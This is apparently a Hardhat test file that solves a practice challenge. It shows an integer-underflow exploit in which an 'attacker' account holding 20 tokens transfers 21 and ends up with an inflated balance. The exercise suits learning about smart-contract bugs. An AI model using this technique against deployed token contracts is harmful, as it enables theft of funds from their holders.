import { expect } from "chai";
import { ethers } from "hardhat";

describe("Token", async function () {

  it("Should significantly increase the balance ", async function () {
    //+setup
    const [deployer, attacker] = await ethers.getSigners()
    const Token = await ethers.getContractFactory("Token");
    const token = await Token.deploy(21000000);
    await token.deployed();

    await token.transfer(attacker.address, 20)
    //-setup


    //1.Call transfer with a value greater than 20
    await token.connect(attacker).transfer(ethers.constants.AddressZero, 21)

    expect(await token.balanceOf(attacker.address)).to.gt(20)
  });
});